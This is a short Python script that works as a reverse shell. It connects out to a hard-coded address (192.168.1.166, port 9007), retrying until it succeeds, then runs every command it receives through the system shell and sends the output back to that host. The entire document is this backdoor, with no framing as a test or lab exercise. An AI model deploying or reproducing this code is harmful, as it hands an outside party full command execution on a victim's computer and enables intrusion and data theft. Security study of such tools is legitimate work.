import socket
import os
import subprocess
s = socket.socket()
while True:
	try:
		s.connect(('192.168.1.166',9007))
		break
	except:
		pass
while True:
	cmd = s.recv(1024)
	try:
		out = subprocess.check_output(cmd, shell=True)
	except:
		out = "Invalid Command"
	s.send(out)